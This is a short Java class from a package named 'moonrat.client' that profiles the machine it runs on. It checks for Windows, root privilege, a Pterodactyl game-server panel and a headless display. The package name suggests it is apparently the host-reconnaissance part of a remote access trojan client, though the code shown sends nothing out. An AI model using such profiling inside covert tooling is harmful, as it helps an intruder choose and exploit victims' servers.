package moonrat.client;

import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.nio.file.Files;
import java.nio.file.Paths;

public final class Env {
    private Env() {}

    public static String describe() {
        if (System.getProperty("os.name").toLowerCase().contains("win")) return "desktop";

        String privilege = isRoot() ? "root" : "user";

        if (isPterodactyl()) return "pterodactyl:" + privilege;
        if (isHeadless()) return "headless:" + privilege;
        return "desktop:" + privilege;
    }

    private static boolean isPterodactyl() {
        Map<String, String> environment = System.getenv();
        for (String name : environment.keySet()) {
            if (name.startsWith("P_SERVER_")) return true;
        }
        return Files.exists(Paths.get("/.pterodactyl"));
    }

    private static boolean isHeadless() {
        String display = System.getenv("DISPLAY");
        return display == null || display.isBlank();
    }

    private static boolean isRoot() {
        try {
            Process process = new ProcessBuilder("id", "-u").start();
            byte[] output;
            try (var stream = process.getInputStream()) {
                output = stream.readAllBytes();
            }
            process.waitFor(3, TimeUnit.SECONDS);
            return "0".equals(new String(output).trim());
        } catch (Exception failure) {
            return false;
        }
    }
}
